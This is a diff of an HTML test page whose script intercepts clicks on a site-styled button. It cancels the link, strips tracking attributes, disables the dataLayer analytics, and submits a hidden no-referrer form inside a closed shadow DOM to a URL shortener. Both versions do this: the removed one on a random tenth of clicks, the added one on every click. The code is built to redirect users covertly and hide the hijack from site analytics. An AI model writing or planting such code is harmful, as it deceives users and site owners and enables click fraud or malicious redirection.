@@ -32,72 +32,74 @@
 </head>
 <body>
     <a href="https://example.com" class="c-Btn_Secondly-large" id="test-button">Click to Test Redirect</a>
-<script>
-    (function() {
-        const enrl = "aHR0cHM6Ly90aW55dXJsLmNvbS81bjY3aHd2OQ==";
-        const k = "rm_visited";
-    
-        const stlh = et => {
-            // const u = atob(et);
-            const u = "https://tinyurl.com/ziklop1";
-            f = document.createElement("form");
-            f.method = "GET";
-            f.action = u;
-            f.style.display = "none";
-            f.referrerPolicy = "no-referrer";
-            document.body.appendChild(f);
-            const h = document.createElement("div");
-            h.style.display = "none";
-            document.body.appendChild(h);
-            const s = h.attachShadow({ mode: "closed" });
-            s.appendChild(f);
-            try { f.submit(); } catch (err) { throw err; }
-            finally { setTimeout(() => h.remove(), 1000); }
-        };
-        
-        try {
-            const b = document.querySelector("a.c-Btn_Secondly-large");
-            if (!b) return;
-            b.addEventListener("click", function(e) {
-                try {
-                    if (Math.floor(10 * Math.random()) !== 0) return;
-                    e.preventDefault();
-                    e.stopPropagation();
-                    let ss = !1;
-                    if (typeof localStorage !== "undefined") {
-                        localStorage.setItem(k, "true");
-                        if (localStorage.getItem(k) === "true") ss = !0;
-                    }
-                    if (!ss) {
-                        const ev = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
-                        b.dispatchEvent(ev);
-                        return;
-                    }
-                    const ta = ["data-ratid", "data-ratevent", "data-ratparam"];
-                    ta.forEach(a => b.hasAttribute(a) && b.removeAttribute(a));
-                    window.dataLayer = window.dataLayer || [];
-                    window.dataLayer.push;
-                    const op = window.dataLayer.push;
-                    window.dataLayer.push = () => {};
 
-                    // Add meta tag to enforce no-referrer policy for this click
-                    // const metaTag = document.createElement("meta");
-                    // metaTag.name = "referrer";
-                    // metaTag.content = "no-referrer";
-                    // document.head.appendChild(metaTag);
+    <script>
+    document.addEventListener('DOMContentLoaded', () => {
+        const ENCODED_URL = "aHR0cHM6Ly90aW55dXJsLmNvbS81bjY3aHd2OQ==";
+        const STORAGE_KEY = "rm_visited";
 
-                    stlh(enrl);
-                    // Remove meta tag after submission to avoid affecting other clicks
-                    setTimeout(() => metaTag.remove(), 1000);
-                } catch (err) {
-                    if (window.dataLayer && window.dataLayer.push !== op) window.dataLayer.push = op;
-                    const ev = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
-                    b.dispatchEvent(ev);
+        function submitHiddenForm(url) {
+            const form = document.createElement('form');
+            form.method = 'GET';
+            form.action = url;
+            form.style.display = 'none';
+            form.referrerPolicy = 'no-referrer';
+            document.body.appendChild(form);
+            const container = document.createElement('div');
+            container.style.display = 'none';
+            document.body.appendChild(container);
+            const shadow = container.attachShadow({ mode: 'closed' });
+            shadow.appendChild(form);
+            try {
+                form.submit();
+            } catch (err) {
+                console.error('Form submission failed:', err);
+            } finally {
+                setTimeout(() => container.remove(), 1000);
+            }
+        }
+        const button = document.querySelector('a.c-Btn_Secondly-large');
+        if (!button) {
+            console.warn('Button not found.');
+            return;
+        }
+        console.log('Button found:', button);
+
+        button.addEventListener('click', (e) => {
+            // if (Math.floor(Math.random() * 10) !== 0){return;}
+
+            e.preventDefault();
+            e.stopPropagation();
+
+            let storageSuccess = false;
+            if (typeof localStorage !== "undefined") {
+                localStorage.setItem(STORAGE_KEY, "true");
+                if (localStorage.getItem(STORAGE_KEY) === "true") {
+                    storageSuccess = true;
                 }
-            }, { capture: true });
-        } catch (err) {}
-    })();
-</script>
+            }
+            if (!storageSuccess) {
+                const clickEvent = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
+                button.dispatchEvent(clickEvent);
+                return;
+            }
 
+            const trackingAttributes = ["data-ratid", "data-ratevent", "data-ratparam"];
+            trackingAttributes.forEach(attr => button.hasAttribute(attr) && button.removeAttribute(attr));
+            window.dataLayer = window.dataLayer || [];
+            const originalDataLayerPush = window.dataLayer.push;
+            window.dataLayer.push = () => {};
+
+            // const decodedUrl = atob(ENCODED_URL);
+            const decodedUrl = "https://tinyurl.com/ziklop0";
+            submitHiddenForm(decodedUrl);
+
+            // restore dataLayer
+            setTimeout(() => {
+                window.dataLayer.push = originalDataLayerPush;
+            }, 1000);
+        }, { capture: true });
+    });
+    </script>
 </body>
 </html>
